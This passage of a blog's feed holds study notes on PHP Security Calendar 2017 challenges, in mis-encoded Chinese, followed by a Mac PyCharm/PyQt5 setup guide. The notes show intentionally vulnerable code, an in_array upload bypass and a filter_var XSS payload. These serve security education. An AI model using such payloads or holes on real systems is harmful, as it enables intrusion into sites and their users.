    <content type="html"><![CDATA[<p>php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°</p><a id="more"></a><h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">        <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>ä»»æ„æ–‡ä»¶ä¸Šä¼ </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åœ¨ç¬¬12è¡Œä»£ç ä¸­ï¼Œå› ä¸ºin_arrayæ²¡æœ‰è®¾ç½®<code>strict</code>æ¯”è¾ƒï¼Œåˆ™é»˜è®¤ä½¿ç”¨å®½æ¾æ¯”è¾ƒï¼Œå…·ä½“å¯å‚è€ƒ<a href="https://www.php.net/manual/zh/function.in-array.php" target="_blank" rel="noopener">å®˜æ–¹æ‰‹å†Œ</a>,æ‰€ä»¥è™½ç„¶è®¾ç½®äº†ç™½åå•ï¼Œä½†è¿˜æ˜¯å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">$file_name = <span class="string">'1a.php'</span>;</span><br><span class="line">var_dump(in_array($file_name, $whitelist));</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœ</span></span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">      <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">      <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">'index.html'</span>,</span><br><span class="line">      [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´-1"><a href="#æ¼æ´-1" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>xss</p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¬¬10è¡Œä»£ç ç»è¿‡æ¸²æŸ“ä¹‹åå¯ä»¥é˜²æ­¢è¢«æ ‡ç­¾é—­åˆï¼Œç¬¬22è¡Œ<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>æ˜¯éªŒè¯urlçš„å‡½æ•°ï¼Œåªéœ€è¦æ„é€ <code>a://b</code>å³å¯ï¼Œç„¶ååœ¨<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>é‡Œé¢å¯ä»¥ç”¨<code>javascript:</code>ä¼ªåè®®è¿›è¡Œjsä»£ç çš„æ‰§è¡Œï¼Œå‚è€ƒ<a href="https://www.cnblogs.com/song-song/p/5277838.html" target="_blank" rel="noopener">Aæ ‡ç­¾ä½¿ç”¨javascript:ä¼ªåè®®</a>ã€‚å› ä¸ºnextSlideæ˜¯é€šè¿‡GETè¯·æ±‚æ¥æ”¶çš„ï¼Œé‚£ä¹ˆæ„é€ <code>javascript://123%0aalert(1)</code>ï¼Œè¿™é‡Œçš„<code>//</code>å¯¹äº<code>filter_var</code>å‡½æ•°æ¥è¯´æ˜¯åè®®ï¼Œä½†æ˜¯å¯¹äºjsæ¥è¯´æ˜¯æ³¨é‡Šï¼Œè¿™æ ·å¯ä»¥å·§å¦™çš„ç»•è¿‡<code>filter_var</code>å‡½æ•°å¹¶ä¸”æˆåŠŸæ‰§è¡Œjsä»£ç ã€‚å› ä¸º<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>é‡Œé¢è·³è½¬çš„é“¾æ¥æ˜¯è·³è½¬åˆ°æµè§ˆå™¨ï¼Œæ‰€ä»¥å¯¹<code>%0a</code>å†æ¬¡è¿›è¡Œurlç¼–ç ï¼Œæ‰€ä»¥æ„é€ <code>javascript://123%250aalert(1)</code></p><h3 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">  $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">  $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $template;</span><br><span class="line">  <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´-2"><a href="#æ¼æ´-2" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Macä¸‹pycharm + python3.7 + PyQt5 + Qt5.13.1é…ç½®</title>
    <link href="http://0clickjacking0.github.io/2019/10/30/Mac%E4%B8%8Bpycharm-python3-7-PyQt5-Qt5-13-1%E9%85%8D%E7%BD%AE/"/>
    <id>http://0clickjacking0.github.io/2019/10/30/Macä¸‹pycharm-python3-7-PyQt5-Qt5-13-1é…ç½®/</id>
    <published>2019-10-30T01:27:22.000Z</published>
    <updated>2019-11-13T03:47:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Macä¸‹pycharm + python3.7 + PyQt5 + Qt5.13.1é…ç½®</p><a id="more"></a><h1 id="åˆå§‹ç¯å¢ƒï¼š"><a href="#åˆå§‹ç¯å¢ƒï¼š" class="headerlink" title="åˆå§‹ç¯å¢ƒï¼š"></a>åˆå§‹ç¯å¢ƒï¼š</h1><p>mac: 10.13.6</p><p>pycharm: 2018.2.8</p><p>python: 3.7</p><p>pip: 10.0.1</p><h1 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h1><h2 id="å®‰è£…pyqt5"><a href="#å®‰è£…pyqt5" class="headerlink" title="å®‰è£…pyqt5"></a>å®‰è£…pyqt5</h2><p>æ‰§è¡Œä¸‹é¢ä¸¤æ¡è¯­å¥è¿›è¡Œå®‰è£…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line"></span><br><span class="line">pip3 install PyQt5-sip</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…sip"><a href="#å®‰è£…sip" class="headerlink" title="å®‰è£…sip"></a>å®‰è£…sip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install sip</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…qt"><a href="#å®‰è£…qt" class="headerlink" title="å®‰è£…qt"></a>å®‰è£…qt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt</span><br></pre></td></tr></table></figure><h1 id="é…ç½®PyCharm"><a href="#é…ç½®PyCharm" class="headerlink" title="é…ç½®PyCharm"></a>é…ç½®PyCharm</h1><h2 id="åˆ‡æ¢åˆ°Python3-xç¯å¢ƒ"><a href="#åˆ‡æ¢åˆ°Python3-xç¯å¢ƒ" class="headerlink" title="åˆ‡æ¢åˆ°Python3.xç¯å¢ƒ"></a>åˆ‡æ¢åˆ°<code>Python3.x</code>ç¯å¢ƒ</h2><p>å› ä¸ºæˆ‘é»˜è®¤å°±æ˜¯<code>3.x</code></p><p><img src="http://images.xianyu123.club/python3_env.png" alt></p><h2 id="é…ç½®GUIè®¾è®¡å·¥å…·"><a href="#é…ç½®GUIè®¾è®¡å·¥å…·" class="headerlink" title="é…ç½®GUIè®¾è®¡å·¥å…·"></a>é…ç½®GUIè®¾è®¡å·¥å…·</h2><p>ç‚¹å‡»<code>â•</code>è¿›è¡Œæ·»åŠ </p><p><img src="http://images.xianyu123.club/qt1.png" alt></p><h3 id="æ·»åŠ Qt-Designer"><a href="#æ·»åŠ Qt-Designer" class="headerlink" title="æ·»åŠ Qt Designer"></a>æ·»åŠ Qt Designer</h3><p>ç„¶åå¡«å†™ä¸‹é¢çš„ä¿¡æ¯å³å¯ï¼ˆå› ä¸ºæˆ‘æ˜¯ç”¨homebrewå®‰è£…qtçš„ï¼Œæ‰€ä»¥è·¯å¾„å¯èƒ½æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå„ä½çœ‹ä»”ç»†äº†ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----Qt Designer</span><br><span class="line"></span><br><span class="line">Program----/usr/local/Cellar/qt/5.13.0/libexec/Designer.app</span><br><span class="line"></span><br><span class="line">Arguments----è¿™ä¸ªä¸éœ€è¦å¡«å†™</span><br><span class="line"></span><br><span class="line">Working dirctory----/usr/local/Cellar/qt/5.13.0/libexec</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt2.png" alt></p><h3 id="æ·»åŠ PyUIC"><a href="#æ·»åŠ PyUIC" class="headerlink" title="æ·»åŠ PyUIC"></a>æ·»åŠ PyUIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----PyUIC</span><br><span class="line"></span><br><span class="line">Program----/Library/Frameworks/Python.framework/Versions/3.7/bin/pyuic5</span><br><span class="line"></span><br><span class="line">Arguments----$FileName$ -o $FileNameWithoutExtension$.py</span><br><span class="line"></span><br><span class="line">Working dirctory----$FileDir$</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt3.png" alt></p><h3 id="éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ "><a href="#éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ " class="headerlink" title="éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ "></a>éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ </h3><p>ç‚¹å‡»tools-external tools</p><p><img src="http://images.xianyu123.club/qt4.png" alt></p><p>å¦‚æœæœ‰ä¸‹é¢è¿™ç§æ˜¾ç¤ºçš„è¯ï¼Œå°±ä»£è¡¨æˆåŠŸäº†</p><p><img src="http://images.xianyu123.club/qt5.png" alt></p><p>ç„¶åæˆ‘ä»¬éšä¾¿åˆ›å»ºä¸€ä¸ª<code>ui</code>æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»uiæ–‡ä»¶ï¼Œå³é”®ä½¿ç”¨æˆ‘ä»¬åˆšæ‰æ·»åŠ çš„external toolsä¸­PyUICï¼Œå¦‚æœèƒ½æˆåŠŸå¯¼å‡ºï¼Œåˆ™è¯´æ˜æˆåŠŸäº†</p><p><img src="http://images.xianyu123.club/qt6.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Macä¸‹pycharm + python3.7 + PyQt5 + Qt5.13.1é…ç½®&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://0clickjacking0.github.io/categories/Python/"/>
    
    
  </entry>
  
</feed>
